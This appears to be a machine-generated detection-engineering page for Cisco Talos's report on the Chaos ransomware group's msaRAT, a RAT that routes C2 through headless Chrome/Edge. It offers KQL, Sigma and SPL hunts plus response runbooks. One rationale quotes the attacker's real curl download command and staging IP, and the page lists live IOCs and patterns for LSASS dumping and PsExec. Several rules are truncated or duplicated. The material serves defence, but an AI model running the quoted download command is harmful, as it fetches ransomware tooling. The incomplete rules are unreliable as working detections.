Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel

Cisco Talos
2026-07-23 10 use cases 3 techniques 5 kill-chain phases detected

The Chaos ransomware group uses new malware "msaRAT" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] msaRAT delivery: curl.exe fetching fake Windows-update MSI to ProgramData over HTTP
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Article-specific behavioural hunt — Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] msaRAT msiexec executing update_ms.msi (fake Windows update custom action)
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] msaRAT CDP abuse: headless Chrome/Edge with remote-debugging port spawned by non-browser parent · [LLM] msaRAT C2 network IOC: connection to 172.86.126.18 or is-01-ast.ols-img-12.workers.dev · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
msaRAT delivery: curl.exe fetching fake Windows-update MSI to ProgramData over HTTP AIDelivery High
Hunts the Chaos ransomware pre-ransom delivery step where curl.exe downloads update_ms.msi from attacker IP 172.86.126.18 (plain HTTP on port 443) into C:\programdata\. Article-specific because it anchors on the exact filename, ProgramData sink, and hardcoded C2 IP. Rationale: Anchors on the verbatim curl command from the article (update_ms.msi, hardcoded 172.86.126.18, ProgramData sink) — the triple combination is essentially unique to this campaign. Cross-checked against: • https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/ • https://malware.news/t/chaos-ransomwares-msarat-living-off-the-browser-to-build-a-covert-c2-channel/124199 • https://blog.talosintelligence.com/new-chaos-ransomware/
ATT&CKT1105 T1218.007
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate admin using curl to stage a genuine .msi in ProgramData for software deployment
  • Internal software-distribution tooling pulling installers over HTTP to a ProgramData staging folder
  • Security researcher / detection-lab replaying the sample
  • RMM agent using curl to fetch an update package into ProgramData
Suppression filter
| where not (InitiatingProcessFileName in~ ("ansible.exe","chocolatey.exe","choco.exe") and ProcessCommandLine !has "172.86.126.18")
Response runbook
1. Triage: confirm the curl invocation targeted 172.86.126.18 or the literal update_ms.msi filename and that the destination is C:\programdata\; pull the parent process and user. 2. Contain: network-isolate the host, block 172.86.126.18 at the perimeter, and quarantine C:\programdata\update_ms.msi before it is executed by msiexec. 3. Hunt: pivot to msiexec execution of that MSI, headless Chrome/Edge launches with --remote-debugging-port, and outbound traffic to is-01-ast.ols-img-12.workers.dev across the estate.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "curl.exe"
| where ProcessCommandLine has_any ("update_ms.msi", "172.86.126.18")
| where ProcessCommandLine has "programdata"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where TargetProcessName has "curl.exe"
| where TargetProcessCommandLine has_any ("update_ms.msi", "172.86.126.18")
| where TargetProcessCommandLine has "programdata"
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName, TargetProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc
title: msaRAT Delivery via curl Downloading Fake Windows Update MSI to ProgramData
id: 6c2f4b1a-9d3e-4a77-8f2b-11a2c9d4e5f0
description: Detects Chaos ransomware msaRAT delivery where curl.exe downloads update_ms.msi from attacker IP 172.86.126.18 into ProgramData
references:
  - https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
author: SOC Detection Engineering
date: 2026/07/23
tags:

  - attack.t1218.007
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\curl.exe'
    CommandLine|contains:
      - 'update_ms.msi'
      - '172.86.126.18'
  location:
    CommandLine|contains: 'programdata'
  condition: selection and location
level: high
source:windows.sysmon @EventID:1 @Image:(*\\curl.exe OR *\\Curl.exe OR *\\CURL.EXE) (@CommandLine:*update_ms.msi* OR @CommandLine:*172.86.126.18*) @CommandLine:*programdata*
#event_simpleName=ProcessRollup2 ImageFileName=/curl\.exe$/i
| CommandLine=/(update_ms\.msi|172\.86\.126\.18)/i
| CommandLine=/programdata/i
| groupBy([aid, ComputerName, ParentBaseFileName, CommandLine], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name=curl.exe (Processes.process="*update_ms.msi*" OR Processes.process="*172.86.126.18*") Processes.process="*programdata*" by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name=curl.exe (Processes.process="*update_ms.msi*" OR Processes.process="*172.86.126.18*") Processes.process="*programdata*" by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)
msaRAT msiexec executing update_ms.msi (fake Windows update custom action) AIInstallation High
Hunts the second delivery stage: msiexec.exe executing the Chaos-dropped update_ms.msi whose custom action CA_Run_EA2AEBC3 reflectively loads lib.dll (msaRAT) into memory. Article-specific via the exact MSI filename. Rationale: The MSI filename update_ms.msi is a verbatim article IOC; msiexec running it from ProgramData is the reflective-load launcher for lib.dll (msaRAT). Cross-checked against: • https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/ • https://malware.news/t/chaos-ransomwares-msarat-living-off-the-browser-to-build-a-covert-c2-channel/124199
ATT&CKT1218.007 T1620
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate vendor MSI happening to be staged in ProgramData (broad hunting clause only)
  • Patch-management tool invoking msiexec against a ProgramData-cached installer
  • Detection-lab replay of the sample
  • Third-party updater masquerading its own installer in ProgramData
Suppression filter
| where ProcessCommandLine has "update_ms.msi"
Response runbook
1. Triage: confirm msiexec ran update_ms.msi and inspect the MSI's Binary table / custom action (CA_Run_*) and file metadata spoofing Microsoft. 2. Contain: isolate the host, kill any child processes, and capture memory before reboot to recover the in-memory lib.dll (msaRAT). 3. Hunt: look for the RUN export being invoked, headless browser launches with CDP flags, and workers.dev / Twilio TURN egress to confirm C2 establishment.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "msiexec.exe"
| where ProcessCommandLine has "update_ms.msi" or (ProcessCommandLine has @"\programdata\" and ProcessCommandLine has ".msi")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where TargetProcessName has "msiexec.exe"
| where TargetProcessCommandLine has "update_ms.msi" or (TargetProcessCommandLine has @"\programdata\" and TargetProcessCommandLine has ".msi")
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName, TargetProcessCommandLine, ParentProcessName
| order by TimeGenerated desc

msaRAT CDP abuse: headless Chrome/Edge with remote-debugging port spawned by non-browser parent AICommand & Control Medium
Hunts msaRAT's core 'living off the browser' behaviour — it launches Chrome or Edge in headless mode with the CDP remote-debugging port enabled to drive a covert WebRTC C2. Detects browsers started with --headless/--remote-debugging-port by a parent that is not a browser or explorer. Rationale: The article states msaRAT launches Chrome/Edge headless via CreateProcessW with the remote-debugging port enabled to drive CDP; a browser started with these flags by a non-browser parent is a high-fidelity signal of programmatic browser hijack. Cross-checked against: • https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/ • https://www.bleepingcomputer.com/news/security/chaes-malware-now-uses-google-chrome-devtools-protocol-to-steal-data/
ATT&CKT1071.001 T1572 T1218.007
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Puppeteer/Playwright/Selenium automation frameworks launching headless Chrome for testing
  • CI/CD build agents rendering pages via headless Chrome
  • PDF-generation or web-scraping services spawning headless browsers
  • Developer tooling that opens Chrome with --remote-debugging-port for debugging
Suppression filter
| where InitiatingProcessFileName !in~ ("node.exe", "python.exe", "pwsh.exe", "cypress.exe", "chromedriver.exe", "selenium.exe")
Response runbook
1. Triage: identify the parent process that spawned the headless browser and the remote-debugging port; benign automation parents (node.exe from a known project) differ sharply from msiexec/rundll32/unknown. 2. Contain: if the parent is unexpected, isolate the host and terminate the browser + parent process tree, then capture memory for the in-memory msaRAT. 3. Hunt: correlate with the CDP JSON endpoint (/json/list/) on localhost, WebRTC/TURN egress to global.turn.twilio.com, and connections to is-01-ast.ols-img-12.workers.dev.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("chrome.exe", "msedge.exe")
| where ProcessCommandLine has_any ("--remote-debugging-port", "--headless")
| where InitiatingProcessFileName !in~ ("explorer.exe", "chrome.exe", "msedge.exe", "msedgewebview2.exe", "userinit.exe")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where TargetProcessName has_any ("chrome.exe", "msedge.exe")
| where TargetProcessCommandLine has_any ("--remote-debugging-port", "--headless")
| where not(ParentProcessName has_any ("explorer.exe", "chrome.exe", "msedge.exe", "msedgewebview2.exe", "userinit.exe"))
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName, TargetProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

msaRAT C2 network IOC: connection to 172.86.126.18 or is-01-ast.ols-img-12.workers.dev AICommand & Control Medium
Hunts network contact with the hardcoded Chaos/msaRAT infrastructure — the delivery IP 172.86.126.18 and the Cloudflare Workers signaling endpoint is-01-ast.ols-img-12.workers.dev used for SDP/ICE exchange. Pure IOC pivot corroborated by Talos. Rationale: Both the delivery IP 172.86.126.18 and the Cloudflare Workers signaling domain are verbatim, campaign-unique IOCs from the Talos article; direct network matches are the highest-fidelity possible pivot. Cross-checked against: • https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/ • https://malware.news/t/chaos-ransomwares-msarat-living-off-the-browser-to-build-a-covert-c2-channel/124199
ATT&CKT1102 T1071.001
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate host also using an unrelated *.workers.dev service (mitigated by the exact subdomain match)
  • Threat-intel sandbox / detonation VM deliberately contacting the IOC
  • Security scanner probing the attacker IP
  • Proxy log replay from an IR investigation
Response runbook
1. Triage: identify the source host and the initiating process (a browser process for the workers.dev signaling, or curl/msiexec for the delivery IP). 2. Contain: block 172.86.126.18 and is-01-ast.ols-img-12.workers.dev at the firewall/proxy and network-isolate the source host. 3. Hunt: on the host, look back for the curl download of update_ms.msi, msiexec execution, headless browser launch with CDP flags, RMM tooling, and outbound Twilio TURN (global.turn.twilio.com) traffic indicating the WebRTC DataChannel is live.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP == "172.86.126.18" or RemoteUrl has "is-01-ast.ols-img-12.workers.dev"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort, Protocol
| order by Timestamp desc
CommonSecurityLog
| where TimeGenerated > ago(30d)
| where DestinationIP == "172.86.126.18" or DestinationHostName =~ "is-01-ast.ols-img-12.workers.dev" or RequestURL has "is-01-ast.ols-img-12.workers.dev"
| project TimeGenerated, DeviceVendor, SourceIP, SourceHostName, DestinationIP, DestinationHostName, DestinationPort, RequestURL, ApplicationProtocol, DeviceAction
| order by TimeGenerated desc

Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where (All_Traffic.dest="172.86.126.18" OR All_Traffic.dest_host="is-01-ast.ols-img-12.workers.dev" OR All_Traffic.url="*is-01-ast.ols-img-12.workers.dev*") by All_Traffic.src All_Traffic.dest All_Traffic.dest_host All_Traffic.dest_port All_Traffic.app | `drop_dm_object_name(All_Traffic)` | convert ctime(firstTime) ctime(lastTime)

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
Network connections to article IPs / domains Command & Control High
Outbound traffic to attacker infrastructure named in the article.
ATT&CKT1071
Data sourcesNetwork_Traffic.All_Traffic Web Network_Resolution.DNS DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("172.86.126.18") or RemoteUrl has_any ("is-01-ast.ols-img-12.workers.dev")
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine
let BadIPs     = dynamic(["172.86.126.18"]);
let BadDomains = dynamic(["is-01-ast.ols-img-12.workers.dev"]);
ImNetworkSession

| where DstIpAddr in (BadIPs)
   or Url has_any (BadDomains)

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

title: LSASS Process Access Outside Microsoft-Signed Tooling
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d04
status: experimental
description: |

    Microsoft signed component (Defender, csrss, etc.) is suspect.
    Mimikatz / Pypykatz / nanodump signature.
references:

author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1003.001
    - attack.credential-access
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
    filter_known_good:
        SourceImage|endswith:
            - '\MsSense.exe'
            - '\MsMpEng.exe'
            - '\csrss.exe'
            - '\svchost.exe'

            - '\services.exe'

level: high

        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where (Processes.process="*lsass*" OR Processes.process="*sekurlsa*"
        OR Processes.process="*MiniDump*" OR Processes.process="*comsvcs.dll*MiniDump*"
        OR Processes.process="*procdump*lsass*")
       OR (Processes.process_name="rundll32.exe" AND Processes.process="*comsvcs*MiniDump*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name

Remote service execution — PsExec / SMB lateral movement Actions on Objectives High

ATT&CKT1021.002 T1569.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")
   or (FileName =~ "wmic.exe" and ProcessCommandLine has "/node:")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc

SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688            // process-create (audit-policy required)
| where Account !endswith "$"
| where NewProcessName endswith "\psexec.exe"
   or NewProcessName endswith "\psexesvc.exe"
   or NewProcessName endswith "\paexec.exe"
   or (NewProcessName endswith "\wmic.exe" and CommandLine has "/node:")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: PsExec / SMB Lateral Movement Tooling Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d03
status: experimental
description: |
    PsExec, paexec, smbexec, csexec, remcom — admin-grade tooling that
    pivots over SMB. Pair with `wmic /node:` for the full cluster.
references:
    - https://attack.mitre.org/techniques/T1021/002/
    - https://attack.mitre.org/techniques/T1569/002/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1021.002
    - attack.t1569.002
    - attack.lateral-movement
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_psexec:
        Image|endswith:
            - '\psexec.exe'
            - '\psexec64.exe'
            - '\psexesvc.exe'
            - '\paexec.exe'
            - '\csexec.exe'
            - '\remcom.exe'
            - '\smbexec.py'
    selection_wmic_remote:
        Image|endswith:
            - '\wmic.exe'
        CommandLine|contains:
            - '/node:'
    condition: selection_psexec or selection_wmic_remote
falsepositives:
    - Sysadmins running approved remote-management tooling — wrap with
      a known-admin-host watchlist
level: high
ENDPOINT

| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime

    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")

| `drop_dm_object_name(Processes)`

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code.
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] msaRAT delivery: curl.exe downloads fake Windows-update MSI to ProgramData · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Article-specific behavioural hunt — New msaRAT malware uses Chrome, Edge browsers to route C2 traffic
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] msaRAT: msiexec runs fake update MSI (update_ms.msi) from ProgramData
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] msaRAT covert C2: headless Chrome/Edge launched with remote-debugging port · [LLM] msaRAT C2 signaling: traffic to Cloudflare Workers endpoint / staging IPs · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
msaRAT delivery: curl.exe downloads fake Windows-update MSI to ProgramData AIDelivery High
Hunts the msaRAT LotL delivery step where curl.exe pulls 'update_ms.msi' over HTTP (port 443) from the attacker server and writes it to C:\programdata. Article-specific: the exact download command, the ProgramData drop path, and the hard-coded staging IP 172.86.126.18. Rationale: Uses the exact Talos-documented download command (curl.exe http://172.86.126.18:443/update_ms.msi -o C:\programdata\update_ms.msi) from the infection-chain diagram; the IP, filename and ProgramData path are all campaign-specific. Cross-checked against: • https://malware.news/t/chaos-ransomwares-msarat-living-off-the-browser-to-build-a-covert-c2-channel/124199 • https://blog.talosintelligence.com/new-chaos-ransomware/
ATT&CKT1105 T1218.007 T1036.005
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate admin using curl to fetch an internal MSI over HTTP (would not match the 172.86.126.18 IOC)
  • Software-deployment scripts staging MSIs in ProgramData via curl
  • Developer/testing use of curl with -o to download installers
  • Vendor bootstrap installers that shell out to curl
Suppression filter
| where not (InitiatingProcessFileName in~ ("ccmexec.exe","tanium.exe","amagent.exe") and ProcessCommandLine !has "172.86.126.18")
Response runbook
1) Triage: pull the full curl command line and confirm the destination IP (172.86.126.18) or filename update_ms.msi; check whether C:\programdata\update_ms.msi now exists on disk. 2) Contain: isolate the host, block 172.86.126.18/45.61.134.36 at the firewall, and quarantine the dropped MSI before msiexec runs it. 3) Hunt: on the same host look for a subsequent msiexec.exe execution of the MSI and for chrome/msedge launched with --headless --remote-debugging-port (msaRAT C2 setup); sweep the fleet for the same IOC IPs.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "curl.exe"
| where ProcessCommandLine has ".msi"
| where ProcessCommandLine has_any ("172.86.126.18","update_ms.msi") or (ProcessCommandLine has @"\programdata\" and ProcessCommandLine has_any ("-o","-O","--output","http://"))
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName endswith "\\curl.exe"
| where CommandLine has ".msi"
| where CommandLine has_any ("172.86.126.18","update_ms.msi") or (CommandLine has "\\programdata\\" and CommandLine has_any ("-o","--output","http://"))
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc
title: msaRAT curl.exe Download of Fake Windows Update MSI to ProgramData

description: Detects curl.exe fetching update_ms.msi over HTTP into C:\ProgramData, the msaRAT (Chaos ransomware) delivery step.

detection:
  selection_img:
    Image|endswith: '\curl.exe'
  selection_msi:
    CommandLine|contains: '.msi'
  selection_ioc:
    CommandLine|contains:
      - '172.86.126.18'
      - 'update_ms.msi'
  condition: selection_img and selection_msi and selection_ioc
level: high
source:windows.sysmon @EventID:1 @Image:(*\\curl.exe OR *\\Curl.exe OR *\\CURL.EXE) (@CommandLine:*172.86.126.18* OR @CommandLine:*update_ms.msi*)

| regex("(?i)(172\\.86\\.126\\.18|update_ms\\.msi)", field=CommandLine)
| groupBy([aid, ComputerName, CommandLine], function=count())

| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name=curl.exe (Processes.process="*172.86.126.18*" OR Processes.process="*update_ms.msi*" OR (Processes.process="*\\programdata\\*" AND Processes.process="*.msi*")) by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
msaRAT: msiexec runs fake update MSI (update_ms.msi) from ProgramData AIInstallation High
Detects execution of the msaRAT MSI payload where msiexec.exe launches update_ms.msi staged in C:\programdata — the custom MSI action loads lib.dll into memory. Article-specific: the MSI filename, the unusual ProgramData-root install location, and the curl-staged parent chain. Rationale: Anchors on the Talos-documented payload filename update_ms.msi executed from C:\programdata via msiexec (which triggers custom action CA_Run_EA2AEBC3 loading lib.dll in memory); ProgramData-root MSI execution is inherently rare. Cross-checked against: • https://malware.news/t/chaos-ransomwares-msarat-living-off-the-browser-to-build-a-covert-c2-channel/124199
ATT&CKT1218.007 T1055 T1620
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Third-party installers that copy their MSI to ProgramData before running it
  • Endpoint-management agents caching MSIs in ProgramData subfolders
  • Repackaged in-house software deployed from a ProgramData staging directory
  • Antivirus/EDR self-update MSIs staged locally
Suppression filter
| where not (InitiatingProcessFileName in~ ("services.exe","ccmexec.exe","tiworker.exe") and ProcessCommandLine !has "update_ms.msi")
Response runbook
1) Triage: confirm the MSI path/name is update_ms.msi and check the parent process — a curl.exe/cmd.exe parent that just downloaded it is near-certain malicious. 2) Contain: isolate the host and capture memory (lib.dll runs in-memory only, so disk artifacts may be absent). 3) Hunt: look for chrome/msedge spawned headless with --remote-debugging-port shortly after, and for outbound connections to is-01-ast.ols-img-12.workers.dev or 172.86.126.18/45.61.134.36.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "msiexec.exe"
| where ProcessCommandLine has "update_ms.msi" or (ProcessCommandLine has @"\programdata\" and ProcessCommandLine has ".msi")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName endswith "\\msiexec.exe"
| where CommandLine has "update_ms.msi" or (CommandLine has "\\programdata\\" and CommandLine has ".msi")
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

msaRAT covert C2: headless Chrome/Edge launched with remote-debugging port AICommand & Control Medium
Hunts msaRAT's signature living-off-the-browser step: a non-browser process launches chrome.exe/msedge.exe in headless mode with the CDP remote-debugging interface enabled so JavaScript can be injected to build the WebRTC C2 channel. Article-specific combination of --headless + --remote-debugging-port + custom --user-data-dir from an anomalous parent. Rationale: The --headless + --remote-debugging-port(/pipe) + custom --user-data-dir combo is the exact CDP-hijack technique Talos documented for msaRAT; excluding known automation/browser parents keeps it high-signal since malware injects the browser from an unusual host process. Cross-checked against: • https://malware.news/t/chaos-ransomwares-msarat-living-off-the-browser-to-build-a-covert-c2-channel/124199 • https://blog.talosintelligence.com/new-chaos-ransomware/
ATT&CKT1059.007 T1218 T1105
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Puppeteer/Playwright/Selenium test automation launching headless Chrome with a debug port (parent node.exe/python.exe already excluded)
  • Headless Chrome used for server-side PDF/HTML rendering by an application backend
  • Web-scraping or synthetic-monitoring agents on developer or CI hosts
  • Chromium-based Electron apps spawning a headless helper
  • QA engineers running local browser automation
Suppression filter
| where not (InitiatingProcessFolderPath has_any (@"\selenium\",@"\playwright\",@"\puppeteer\") or InitiatingProcessCommandLine has_any ("puppeteer","playwright","selenium","chromedriver"))
Response runbook
